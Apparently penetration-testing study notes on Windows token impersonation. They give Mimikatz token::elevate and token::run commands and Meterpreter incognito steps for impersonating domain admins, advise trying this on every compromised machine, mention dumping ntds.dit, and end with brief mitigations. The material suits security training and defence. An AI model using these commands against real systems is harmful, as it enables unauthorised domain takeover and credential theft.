## Token Impersonation
```
https://adsecurity.org/?page_id=1821#TOKENElevate https://steflan-security.com/linux-privilege-escalation-token-impersonation/

Whenever a user logs in a machine, windows create a token called delegate token and injects into session. If we have got any access of the machine,we can steal the token and impersonate as that user. If a domain admin logs in the machine,then his token is also available and we can simply impersonate as domain admin using that token. We can then dump ntds.dit and own the domain.

Advice : move from machine to machine and try to find domainadmins token for a easy final win. Try this attack in every machine we get access to

NOTE:Local admin required

Note : If we are administrator or similiar privileges but we are getting error on running mimikatz , list down the process and migrate to a process running as administrator . Same goes for if we are system but our process might be in administrator contex

Using Mimikatz
run mimikatz
    run this command
    token::elevate (impersonate local admin)

or
    token::elevate /domainadmin (impersonate domain admin)

    Now run
    token::run /process:cmd.exe

    Optional commands

    ts::sessions (active sessions)

    token::whoami (current user context)

    token::list (see all available tokens)

    token::revert (revert the token)

Meterpreter
assume we have a meterpreter shell on target(we can use psexec module to get meterpreter session)

    now run
    load incognito
    now run
    list_tokens -u

3.Now we choose any user whos token available and impersonate
    impersonate_token domain\username

Mitigations:

    Domain admins only access domain controllers,limiting attackers attack surface
    Limit Local Admin restriction
    Local Admin passwords must be complex and not same across the network
```
